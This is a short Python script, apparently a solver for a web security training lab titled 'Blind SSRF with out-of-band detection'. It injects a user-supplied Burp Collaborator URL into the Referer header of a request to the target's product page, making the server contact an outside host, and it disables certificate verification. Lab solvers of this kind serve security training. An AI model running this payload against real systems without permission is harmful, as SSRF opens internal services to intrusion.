import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SSRF with out-of-band detection"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into the Referer header to cause an HTTP request to the burp collaborator\n2. Check your burp collaborator for the HTTP request\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "Referer header")

    burp_input = input("[?] Enter the Burp Collaborator URL: ").strip()


    headers = { "Referer": f"http://{burp_input}" }

    print(Fore.WHITE + "[+] Injecting payload to cause an HTTP request to the burp collaborator")

    try:
        print(Fore.WHITE + "[+] Check your burp collaborator for the HTTP request")
        r = requests.get(
            f"{url}/product?productId=1", headers=headers, verify=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
